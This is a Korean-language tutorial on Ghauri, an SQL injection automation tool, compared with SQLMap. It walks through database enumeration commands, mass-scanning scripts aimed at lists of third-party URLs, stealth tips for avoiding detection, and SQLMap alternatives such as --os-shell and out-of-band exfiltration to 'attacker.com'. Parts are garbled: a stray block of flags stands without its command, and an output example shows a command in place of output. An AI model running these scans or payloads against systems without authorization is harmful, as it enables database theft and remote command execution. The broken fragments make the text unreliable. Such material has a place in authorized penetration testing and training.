Ghauri - 차세대 SQL Injection 도구

Ghauri는 Python으로 작성된 현대적인 SQL Injection 자동화 도구로, SQLMap의 속도와 효율성 문제를 개선한 차세대 도구입니다.

개념 (Concept)​

Ghauri란?​

Ghauri는 2021년에 개발된 경량화된 SQL Injection 자동화 도구로, SQLMap의 핵심 기능을 유지하면서 성능을 크게 향상시킨 도구입니다.

프로젝트 정보:

  • 개발자: r0oth3x49
  • 언어: Python 3
  • 라이선스: MIT
  • GitHub: https://github.com/r0oth3x49/ghauri

SQLMap vs Ghauri 비교​

특성SQLMapGhauri
개발 시기2006년2021년
속도중간매우 빠름
의존성많음최소
코드 크기~100MB~10MB
학습 곡선가파름완만
DBMS 지원20+MySQL, MSSQL, PostgreSQL, Oracle (주요 4개)
기법 지원BEUSTQ (6가지)BEUT (4가지)
유지보수활발활발

Ghauri의 장점:

  • ✅ 빠른 속도: SQLMap 대비 2~3배 빠름
  • ✅ 적은 의존성: 설치가 간단
  • ✅ 현대적 코드: 최신 Python 기능 활용
  • ✅ 간결한 출력: 불필요한 로그 최소화
  • ✅ 가벼운 용량: 빠른 다운로드 및 실행

Ghauri의 단점:

  • ❌ DBMS 지원 범위가 SQLMap보다 좁음
  • ❌ 고급 기능 일부 부족 (Tamper scripts 등)
  • ❌ 커뮤니티가 SQLMap보다 작음

설치 (Installation)​

방법 1: pip (권장)​

# pip로 설치
pip install ghauri

# 버전 확인
ghauri --version

출력 예시:

Ghauri v1.2.7

방법 2: Git Clone​

# GitHub에서 클론
git clone https://github.com/r0oth3x49/ghauri.git
cd ghauri

# 의존성 설치
pip install -r requirements.txt

# 실행
python3 ghauri.py --help

방법 3: Docker​

# Dockerfile 생성
cat > Dockerfile <<EOF
FROM python:3.9-slim
RUN pip install ghauri
ENTRYPOINT ["ghauri"]
EOF

# 빌드
docker build -t ghauri .

# 실행
docker run --rm ghauri -u "http://example.com/page?id=1" --batch

주요 옵션 (Main Options)​

타겟 지정​

1. URL 지정 (-u, --url)​

ghauri -u "http://example.com/page?id=1"

2. POST 데이터 (--data)​

ghauri -u "http://example.com/login" --data="username=admin&password=test"

3. 요청 파일 (-r)​

# Burp Suite에서 저장한 요청
ghauri -r request.txt

request.txt:

GET /page?id=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=abc123

4. 특정 파라미터 테스트 (-p)​

ghauri -u "http://example.com/page?id=1&name=test" -p id

5. Cookie 설정 (--cookie)​

ghauri -u "URL" --cookie="session=abc123; role=admin"

6. User-Agent (--user-agent)​

ghauri -u "URL" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

7. HTTP 헤더 (--headers)​

ghauri -u "URL" --headers="Authorization: Bearer token123"

탐지 옵션​

8. 테스트 레벨 (--level)​

# Level 1 (기본): GET/POST 파라미터
ghauri -u "URL" --level=1

# Level 2: Cookie 포함
ghauri -u "URL" --level=2

# Level 3: User-Agent, Referer 포함
ghauri -u "URL" --level=3

9. SQLi 기법 선택 (--technique)​

# Boolean-based만
ghauri -u "URL" --technique=B

# Error-based만
ghauri -u "URL" --technique=E

# Union-based만
ghauri -u "URL" --technique=U

# Time-based만
ghauri -u "URL" --technique=T

# 여러 기법 조합
ghauri -u "URL" --technique=BEU

지원 기법:

  • B: Boolean-based Blind
  • E: Error-based
  • U: Union-based
  • T: Time-based Blind

10. DBMS 지정 (--dbms)​

ghauri -u "URL" --dbms=MySQL
ghauri -u "URL" --dbms=MSSQL
ghauri -u "URL" --dbms=PostgreSQL
ghauri -u "URL" --dbms=Oracle

열거 옵션​

11. 현재 데이터베이스 (--current-db)​

ghauri -u "URL" --current-db

출력 예시:

[INFO] fetching current database

12. 모든 데이터베이스 (--dbs)​

ghauri -u "URL" --dbs

출력 예시:

# 현재 DB의 테이블
ghauri -u "URL" --tables

자동화 스크립트 (Automated Scripts)​

Bash 스크립트 - 대량 스캔​

#!/bin/bash

# urls.txt: 타겟 URL 목록
while IFS= read -r url; do
    echo "[*] Testing: $url"

    ghauri -u "$url" \
        --batch \
        --technique=BEU \
        --level=1 \
        --current-db

    echo "---"
done < urls.txt

Python 스크립트 - Ghauri API 사용​

#!/usr/bin/env python3

import subprocess
import json

def run_ghauri(url):
    """Ghauri 실행 및 결과 파싱"""
    cmd = [
        "ghauri",
        "-u", url,
        "--batch",
        "--current-db"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    # 출력 파싱
    if "current database:" in result.stdout:
        db_name = result.stdout.split("current database: '")[1].split("'")[0]
        return {"vulnerable": True, "database": db_name}
    else:
        return {"vulnerable": False}

# 사용 예시
targets = [
    "http://site1.com/page?id=1",
    "http://site2.com/product?pid=5"
]

for target in targets:
    print(f"[*] Testing: {target}")
    result = run_ghauri(target)

    if result["vulnerable"]:
        print(f"[+] VULNERABLE! Database: {result['database']}")
    else:
        print("[-] Not vulnerable")

고급 기법 (Advanced Techniques)​

1. 프록시 사용 (--proxy)​

# HTTP 프록시
ghauri -u "URL" --proxy="http://127.0.0.1:8080"

# Burp Suite
ghauri -u "URL" --proxy="http://127.0.0.1:8080"

2. 타임아웃 및 재시도​

# 타임아웃 30초
ghauri -u "URL" --timeout=30

# 재시도 3번
ghauri -u "URL" --retries=3

3. 스레드 수 증가​

# 10개 스레드 (기본값: 1)
ghauri -u "URL" --threads=10

4. Verbose 모드​

# 상세 출력
ghauri -u "URL" -v

# 매우 상세 출력 (페이로드 포함)
ghauri -u "URL" -vv

5. 플러시 세션​

# 이전 세션 삭제 후 재시작
ghauri -u "URL" --flush-session

    --delay=2 \
    --retries=3 \
    --user-agent="Mozilla/5.0" \
    --batch

SQLMap vs Ghauri 실전 비교​

속도 테스트​

SQLMap:

time sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --dbs

Ghauri:

time ghauri -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --dbs

결과:

  • SQLMap: ~45초
  • Ghauri: ~18초

→ Ghauri가 2.5배 빠름

용량 비교​

# SQLMap
du -sh /usr/share/sqlmap/
# 출력: 96M

# Ghauri
du -sh $(pip show ghauri | grep Location | awk '{print $2}')/ghauri/
# 출력: 8.5M

→ Ghauri가 11배 작음

Ghauri의 한계와 대안​

Ghauri가 부족한 경우​

1. 마이너 DBMS 지원​

Ghauri는 주요 4개 DBMS만 지원:

  • MySQL, MSSQL, PostgreSQL, Oracle

대안: SQLMap 사용

sqlmap -u "URL" --dbms=DB2  # IBM DB2

2. Tamper Scripts​

Ghauri는 Tamper script 미지원

대안: SQLMap의 70개 이상 Tamper 사용

sqlmap -u "URL" --tamper=space2comment,between

3. OS 명령 실행 (--os-shell)​

Ghauri는 OS 쉘 기능 없음

대안: SQLMap 사용

sqlmap -u "URL" --os-shell

4. Out-of-Band SQLi​

Ghauri는 OOB 미지원

대안: SQLMap 사용

sqlmap -u "URL" --dns-domain="attacker.com"

최적화 팁​

1. 빠른 스캔​

# Union-based만 사용 (가장 빠름)
ghauri -u "URL" --technique=U --threads=10

2. 정확한 스캔​

# 모든 기법 사용
ghauri -u "URL" --technique=BEUT --level=3

3. 스텔스 스캔​

# 지연 추가 + 단일 스레드
ghauri -u "URL" --delay=3 --threads=1 --user-agent="Mozilla/5.0"

트러블슈팅​

1. "No parameter(s) found" 에러​

원인: 파라미터를 찾지 못함

해결:

# 파라미터 명시
ghauri -u "URL" -p id

# 요청 파일 사용
ghauri -r request.txt

2. 연결 실패​

해결:

# 타임아웃 증가
ghauri -u "URL" --timeout=60 --retries=5

3. False Positive​

해결:

# 레벨 낮춤
ghauri -u "URL" --level=1 --technique=E
